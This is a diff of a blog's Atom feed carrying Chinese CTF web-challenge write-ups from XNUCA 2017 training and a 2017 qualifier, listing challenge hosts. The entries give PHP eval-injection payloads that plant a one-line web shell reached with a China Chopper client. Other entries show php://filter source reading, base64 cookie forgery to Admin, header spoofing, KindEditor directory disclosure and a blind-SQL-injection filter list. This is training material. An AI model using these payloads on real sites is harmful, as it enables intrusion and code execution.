class="line">)<span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> <span class="string">`flags`</span>;</div><div class="line"></div><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="string">`flags`</span> (</div><div class="line"></div><div class="line">      <span class="string">`id`</span> tinyint <span class="keyword">not</span> <span class="literal">null</span> primary <span class="keyword">key</span> ,</div><div class="line">      <span class="string">`flag`</span> <span class="built_in">varchar</span>(<span class="number">50</span>) <span class="keyword">not</span> <span class="literal">null</span></div><div class="line">)<span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span>  <span class="string">`page`</span> <span class="keyword">values</span> (<span class="number">20</span>);</div><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span>   <span class="string">`note`</span> (title,<span class="keyword">content</span>,userid)<span class="keyword">values</span>(</div><div class="line">     <span class="string">'测试笔记'</span>,<span class="string">'这是管理员发布的测试笔记,个人无法删除(hint:./dbinit.sql)'</span>,<span class="number">1</span></div><div class="line">)</div></pre></td></tr></table></figure></p>
+<p>。。不过。。。还没想出来后面咋做。。。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>此题为 2017 铁人三项地区资格赛-套路那么长 原题。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;未完待续&lt;br&gt;
+    
+    </summary>
+    
+      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>XNUCA 2017-Web专题赛前指导-default-writeup</title>
+    <link href="http://yoursite.com/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-default-writeup/"/>
+    <id>http://yoursite.com/2017/08/16/XNUCA-2017-Web专题赛前指导-default-writeup/</id>
+    <published>2017-08-16T11:28:23.000Z</published>
+    <updated>2017-08-18T11:41:42.724Z</updated>
+    
+    <content type="html"><![CDATA[<p>代码执行，闭合构造<br><a id="more"></a></p>
+<h1 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">描述：主页都没有了，就不要扫我了</div><div class="line"></div><div class="line">http://218.76.35.74:20131</div></pre></td></tr></table></figure>
+<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>此时不扫更待何时。。。扫出一个 index2.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">include</span> <span class="string">"flag2.php"</span>;</div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">show_source(<span class="keyword">__FILE__</span>);</div><div class="line"></div><div class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</div><div class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($a);"</span>);</div></pre></td></tr></table></figure></p>
+<p>传入的参数会经过var_dump()，这里给出两种payload。</p>
+<h2 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">?hello=);eval($_POST[&apos;A&apos;]);%2f%2f</div><div class="line"></div><div class="line">或</div><div class="line"></div><div class="line">?hello=);eval(phpinfo());//</div></pre></td></tr></table></figure>
+<p>var_dump($a);后的结果为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string(22) &quot;);eval($_POST[&apos;A&apos;]);//&quot;</div></pre></td></tr></table></figure></p>
+<p>即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval(&quot;string(21) &quot;);eval($_GET[&apos;A&apos;]);//&quot;&quot;);</div></pre></td></tr></table></figure></p>
+<h2 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?hello=);eval($_GET[c]&amp;c=phpinfo();</div></pre></td></tr></table></figure>
+<p>var_dump()后的结果是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string(15) &quot;);eval($_GET[c]&quot;</div></pre></td></tr></table></figure></p>
+<p>即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval(&quot;string(17) &quot;);eval($_GET[c]&quot; string(0) &quot;&quot; &quot;);</div></pre></td></tr></table></figure></p>
+<p>因此可以通过构造闭合引号。用菜刀连上：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170814/8.png?raw=true" alt=""></p>
+<p>真正的flag在flag1.php里。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">F8871804DD8C20C66D2386B3E51ADEC4</div></pre></td></tr></table></figure></p>
+<h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><p>已将此题收录进 <a href="https://github.com/CHYbeta/CTF-Web-Challenge" target="_blank" rel="external">CTF-Web-Challenge</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;代码执行，闭合构造&lt;br&gt;
+    
+    </summary>
+    
+      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>XNUCA 2017-Web专题赛前指导-部分简单题汇总-writeup</title>
+    <link href="http://yoursite.com/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%83%A8%E5%88%86%E7%AE%80%E5%8D%95%E9%A2%98%E6%B1%87%E6%80%BB-writeup/"/>
+    <id>http://yoursite.com/2017/08/16/XNUCA-2017-Web专题赛前指导-部分简单题汇总-writeup/</id>
+    <published>2017-08-16T11:12:31.000Z</published>
+    <updated>2017-08-18T11:42:52.042Z</updated>
+    
+    <content type="html"><![CDATA[<p>这些都是一些很简单的题。另有一些题会单独拿出来写。<br><a id="more"></a></p>
 <h1 id="捉迷藏"><a href="#捉迷藏" class="headerlink" title="捉迷藏"></a>捉迷藏</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20111</div></pre></td></tr></table></figure>
 <p>查看源代码，发现链接：<a href="http://218.76.35.75:20111/Index.php" target="_blank" rel="external">http://218.76.35.75:20111/Index.php</a><br>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">th!5!5n0tth3fl@g</div></pre></td></tr></table></figure></p>
 <h1 id="简单问答"><a href="#简单问答" class="headerlink" title="简单问答"></a>简单问答</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20112</div></pre></td></tr></table></figure>
@@ -259,9 +421,7 @@
 <p>试着进入Admin Portal，同时用burp截包看看：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">POST / HTTP/1.1</div><div class="line">Host: 218.76.35.75:20113</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://218.76.35.75:20113/</div><div class="line">Cookie: PHPSESSID=lhempf2nd6m7oj4joinm11pmh7; User=JohnTan101; Member=Tm9ybWFs</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 17</div><div class="line"></div><div class="line">adminportal=Enter</div></pre></td></tr></table></figure>
 <p>其中Cookie字段中，User为JohnTan101，Member为Tm9ybWFs，用base64解码后为Normal。<br>Forward掉后，页面返回提示：Only Member with Admin rights is allow to enter<br>将Admin进行base64加密后得到QWRtaW4=，作为Member的值，发包，得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C00ki3_n0m_n0m_n0m</div></pre></td></tr></table></figure></p>
-<h1 id="php是最好的语言"><a href="#php是最好的语言" class="headerlink" title="php是最好的语言"></a>php是最好的语言</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20114/</div></pre></td></tr></table></figure>
-<p>源代码如下:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">show_source(<span class="keyword">__FILE__</span>);</div><div class="line">$v1=<span class="number">0</span>;$v2=<span class="number">0</span>;$v3=<span class="number">0</span>;</div><div class="line">$a=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'foo'</span>]);</div><div class="line"><span class="keyword">if</span>(is_array($a))&#123;</div><div class="line">   is_numeric(@$a[<span class="string">"bar1"</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">   <span class="keyword">if</span>(@$a[<span class="string">"bar1"</span>])&#123;</div><div class="line">	   ($a[<span class="string">"bar1"</span>]&gt;<span class="number">2016</span>)?$v1=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">   &#125;</div><div class="line">   <span class="keyword">if</span>(is_array(@$a[<span class="string">"bar2"</span>]))&#123;</div><div class="line">	   <span class="keyword">if</span>(count($a[<span class="string">"bar2"</span>])!==<span class="number">5</span> <span class="keyword">OR</span> !is_array($a[<span class="string">"bar2"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"nope"</span>);</div><div class="line">	   $pos = array_search(<span class="string">"nudt"</span>, $a[<span class="string">"a2"</span>]);</div><div class="line">	   $pos===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">	   <span class="keyword">foreach</span>($a[<span class="string">"bar2"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</div><div class="line">		   $val===<span class="string">"nudt"</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">	   &#125;</div><div class="line">	   $v2=<span class="number">1</span>;</div><div class="line">   &#125;</div><div class="line">&#125;</div><div class="line">$c=@$_GET[<span class="string">'cat'</span>];</div><div class="line">$d=@$_GET[<span class="string">'dog'</span>];</div><div class="line"><span class="keyword">if</span>(@$c[<span class="number">1</span>])&#123;</div><div class="line">   <span class="keyword">if</span>(!strcmp($c[<span class="number">1</span>],$d) &amp;&amp; $c[<span class="number">1</span>]!==$d)&#123;</div><div class="line">	   eregi(<span class="string">"3|1|c"</span>,$d.$c[<span class="number">0</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">	   strpos(($c[<span class="number">0</span>].$d), <span class="string">"htctf2016"</span>)?$v3=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">   &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123;</div><div class="line">   <span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line">   <span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<h1 id="login"><a href="#login" class="headerlink" title="login"></a>login</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20115/</div></pre></td></tr></table></figure>
+<h1 id="php是最好的语言"><a href="#php是最好的语言" class="headerlink" title="php是最好的语言"></a>php是最好的语言</h1><h1 id="login"><a href="#login" class="headerlink" title="login"></a>login</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20115/</div></pre></td></tr></table></figure>
 <p>进去后有三个功能：main显示主页，info显示phpinfo，login是登陆页面。访问时可以发现参数是page=main之类的。猜测有包含，可以利用php伪协议读取源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20115/</div><div class="line">?page=php://filter/read=convert.base64-encode/resource=login</div></pre></td></tr></table></figure></p>
 <p>得到login的源码如下:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$login=@$_POST[<span class="string">'login'</span>];</div><div class="line">$password=@$_POST[<span class="string">'password'</span>];</div><div class="line"><span class="keyword">if</span>(@$login==<span class="string">"admin"</span> &amp;&amp; sha1(@$password)==$pwhash)&#123;</div><div class="line">	<span class="keyword">include</span>(<span class="string">'flag.txt'</span>);</div><div class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@$login&amp;&amp;@$password&amp;&amp;@$_GET[<span class="string">'debug'</span>]) &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"Login error, login credentials has been saved to ./log/"</span>.htmlentities($login).<span class="string">".log"</span>;</div><div class="line">	$logfile = <span class="string">"./log/"</span>.$login.<span class="string">".log"</span>;</div><div class="line">	file_put_contents($logfile, $login.<span class="string">"\n"</span>.$password);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">	&lt;center&gt;</div><div class="line">		login&lt;br/&gt;&lt;br/&gt;</div><div class="line">		&lt;form action=<span class="string">""</span> method=<span class="string">"POST"</span>&gt;</div><div class="line">			&lt;input name=<span class="string">"login"</span> placeholder=<span class="string">"login"</span>&gt;&lt;br/&gt;</div><div class="line">			&lt;input name=<span class="string">"password"</span> placeholder=<span class="string">"password"</span>&gt;&lt;br/&gt;&lt;br/&gt;</div><div class="line">			&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Go!"</span>&gt;</div><div class="line">		&lt;/form&gt;</div><div class="line">	&lt;/center&gt;</div></pre></td></tr></table></figure></p>
 <p>另外读取到index.php的源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20115/?page=php://filter/read=convert.base64-encode/resource=index</div></pre></td></tr></table></figure></p>
@@ -296,12 +456,34 @@
 <h1 id="简单的验证"><a href="#简单的验证" class="headerlink" title="简单的验证"></a>简单的验证</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">描述：你不是amdin，没有权限查看flag</div><div class="line"></div><div class="line">http://218.76.35.75:20127</div></pre></td></tr></table></figure>
 <p>截包，看Cookie字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Cookie: user=Bob; guess=999</div></pre></td></tr></table></figure></p>
 <p>题目的提示错了，应该是admin。<br>把Bob改为admin，然后guess用burp来爆破，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EaSy70Ch1ngG00kie</div></pre></td></tr></table></figure></p>
-<h1 id="vote"><a href="#vote" class="headerlink" title="vote"></a>vote</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">描述：据说可以注入，然而……</div><div class="line"></div><div class="line">http://218.76.35.75:65080/</div></pre></td></tr></table></figure>
+<h1 id="GG"><a href="#GG" class="headerlink" title="GG"></a>GG</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">描述：游戏似乎很无聊啊</div><div class="line"></div><div class="line">http://218.76.35.75:65380/</div></pre></td></tr></table></figure>
+<p>访问后查看源代码，有个 tetris.js 。前端游戏这种，往往是在打通关之类的会给一些奇葩的提示或者直接出flag。对代码进行美化后，比如搜索gameover。找到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">this.gameOver = function() &#123;</div><div class="line">	b.stats.stop();</div><div class="line">	b.puzzle.stop();</div><div class="line">	document.getElementById(&quot;tetris-nextpuzzle&quot;).style.display = &quot;none&quot;;</div><div class="line">	document.getElementById(&quot;tetris-gameover&quot;).style.display = &quot;block&quot;;</div><div class="line">	if (this.highscores.mayAdd(this.stats.getScore())) &#123;</div><div class="line">		var e = prompt(&quot;Game Over !\nEnter your name:&quot;, &quot;&quot;);</div><div class="line">		e &amp;&amp; e.trim().length &amp;&amp; this.highscores.add(e, this.stats.getScore())</div><div class="line">	&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
+<p>里面有mayAdd，找到一处：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.mayAdd = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</div><div class="line">			<span class="keyword">if</span> (<span class="keyword">this</span>.scores.length &lt; <span class="keyword">this</span>.maxscores) <span class="keyword">return</span> <span class="number">1E6</span> &lt; a &amp;&amp; (a = <span class="keyword">new</span> p, a.set(<span class="string">"urlkey"</span>, <span class="string">"webqwer"</span> [<span class="number">1</span>] + <span class="string">"100.js"</span>, <span class="number">864E5</span>)), !<span class="number">0</span>;</div><div class="line">			<span class="keyword">for</span> (<span class="keyword">var</span> b = <span class="keyword">this</span>.scores.length - <span class="number">1</span>; <span class="number">0</span> &lt;= b; --b) <span class="keyword">if</span> (<span class="keyword">this</span>.scores[b].score &lt; a) <span class="keyword">return</span> <span class="number">1E6</span> &lt; a &amp;&amp; (a = <span class="keyword">new</span> p, a.set(<span class="string">"urlkey"</span>, <span class="string">"webqwer"</span> [<span class="number">1</span>] + <span class="string">"100.js"</span>, <span class="number">864E5</span>)), !<span class="number">0</span>;</div><div class="line">			<span class="keyword">return</span> !<span class="number">1</span></div><div class="line">		&#125;;</div></pre></td></tr></table></figure></p>
+<p><code>&quot;webqwer&quot; [1] + &quot;100.js&quot;</code>，即<code>e100.js</code>。访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:65380/e100.js</div></pre></td></tr></table></figure></p>
+<p>出现jsfuck编码，放到f12控制台里运行一下，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">oT0yTrjU0xhjhj2YTcT8jljMWpzS9tDk</div></pre></td></tr></table></figure></p>
+<h1 id="Reappear"><a href="#Reappear" class="headerlink" title="Reappear"></a>Reappear</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">描述：网管说他安装了什么编辑器，但是似乎不太会用。。。</div><div class="line"></div><div class="line">http://218.76.35.75:65180/</div></pre></td></tr></table></figure>
+<p>访问后有提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Kindeditor v4.1.7</div><div class="line">something maybe in /kindeditor/</div></pre></td></tr></table></figure></p>
+<p>网上有对应的信息泄露漏洞。访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:65180/kindeditor/php/file_manager_json.php</div></pre></td></tr></table></figure></p>
+<p>得到如下数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">/var/www/html/Web/kind/kindeditor/attached</div><div class="line">&#123;</div><div class="line">&quot;moveup_dir_path&quot;:&quot;&quot;,</div><div class="line">&quot;current_dir_path&quot;:&quot;&quot;,</div><div class="line">&quot;current_url&quot;:&quot;\/kindeditor\/php\/..\/attached\/&quot;,</div><div class="line">&quot;total_count&quot;:2,</div><div class="line">&quot;file_list&quot;:[</div><div class="line">	&#123;&quot;is_dir&quot;:false,</div><div class="line">	&quot;has_file&quot;:false,</div><div class="line">	&quot;filesize&quot;:51,</div><div class="line">	&quot;dir_path&quot;:&quot;&quot;,</div><div class="line">	&quot;is_photo&quot;:false,</div><div class="line">	&quot;filetype&quot;:&quot;php&quot;,</div><div class="line">	&quot;filename&quot;:&quot;flag_clue.php&quot;,</div><div class="line">	&quot;datetime&quot;:&quot;2015-11-16 21:58:28&quot;</div><div class="line">	&#125;,</div><div class="line">	&#123;&quot;is_dir&quot;:false,</div><div class="line">	&quot;has_file&quot;:false,</div><div class="line">	&quot;filesize&quot;:28,</div><div class="line">	&quot;dir_path&quot;:&quot;&quot;,</div><div class="line">	&quot;is_photo&quot;:false,</div><div class="line">	&quot;filetype&quot;:&quot;html&quot;,</div><div class="line">	&quot;filename&quot;:&quot;index.html&quot;,</div><div class="line">	&quot;datetime&quot;:&quot;2015-11-16 21:37:12&quot;</div><div class="line">	&#125;</div><div class="line">	]</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>里面有个 flag_clue.php 。访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:65180/kindeditor/attached/flag_clue.php</div></pre></td></tr></table></figure></p>
+<p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">=0nYvpEdhVmcnFUZu9GRlZXd7pzZhxmZ</div></pre></td></tr></table></figure></p>
+<p>脚本:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">import base64</div><div class="line">key = &quot;=0nYvpEdhVmcnFUZu9GRlZXd7pzZhxmZ&quot;</div><div class="line">print(base64.b64decode(key[::-1]))</div></pre></td></tr></table></figure></p>
+<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">b&apos;flag:&#123;uveDoneAgreatJob&#125;&apos;</div></pre></td></tr></table></figure></p>
+<h1 id="DrinkCoffee"><a href="#DrinkCoffee" class="headerlink" title="DrinkCoffee"></a>DrinkCoffee</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">描述：据说登录可以领到咖啡票，不过不知道密码哦……</div><div class="line"></div><div class="line">http://218.76.35.75:65280/</div></pre></td></tr></table></figure>
+<p>访问了之后如下：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170817/1.png?raw=true" alt=""></p>
+<p>需要我们输入一个密码，还有就是ip限制的要求，和来源的要求。</p>
+<p>ip可以通过 X-Forwarded-For 伪造。<br>来源 可以通过 Refferer 伪造。</p>
+<p>抓包后可以看到头部有密码字段：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170817/2.png?raw=true" alt=""></p>
+<p>另外题目在form上加了一层图片，可以用firebug直接把图片去掉，然后就能submit密码了。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170817/3.png?raw=true" alt=""></p>
+<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">84294deb396ba4373c5ea8b73fa111b2</div></pre></td></tr></table></figure></p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;XNUCA 2017-Web专题赛前指导(1)-writeup&lt;br&gt;这些都是一些很简单的题。另有一些题会单独拿出来写。&lt;br&gt;
+      &lt;p&gt;这些都是一些很简单的题。另有一些题会单独拿出来写。&lt;br&gt;
     
     </summary>
     
@@ -313,6 +495,345 @@
       <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
     
       <category term="web" scheme="http://yoursite.com/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>XNUCA 2017-Web专题赛前指导-阳光总在风雨后-writeup</title>
+    <link href="http://yoursite.com/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%98%B3%E5%85%89%E6%80%BB%E5%9C%A8%E9%A3%8E%E9%9B%A8%E5%90%8E-writeup/"/>
+    <id>http://yoursite.com/2017/08/16/XNUCA-2017-Web专题赛前指导-阳光总在风雨后-writeup/</id>
+    <published>2017-08-16T11:11:39.000Z</published>
+    <updated>2017-08-18T11:42:35.186Z</updated>
+    
+    <content type="html"><![CDATA[<p>mysql 盲注</p>
+<p>命令执行 ${IFS}绕过<br><a id="more"></a></p>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.74:20130/index.php</div></pre></td></tr></table></figure>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>经过fuzz，一些关键字被过滤了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">or</div><div class="line">for</div><div class="line">union</div><div class="line">空格</div><div class="line">逗号，</div><div class="line">*</div></pre></td></tr></table></figure></p>
+<p>一些关键字没有过滤：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">select</div><div class="line">from</div><div class="line">where</div><div class="line">substr</div><div class="line">ascii</div><div class="line">^</div><div class="line">.</div></pre></td></tr></table></figure></p>
+<p>无回显，考察盲注。用异或^进行注入。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170814/6.png?raw=true" alt=""></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170814/7.png?raw=true" alt=""></p>
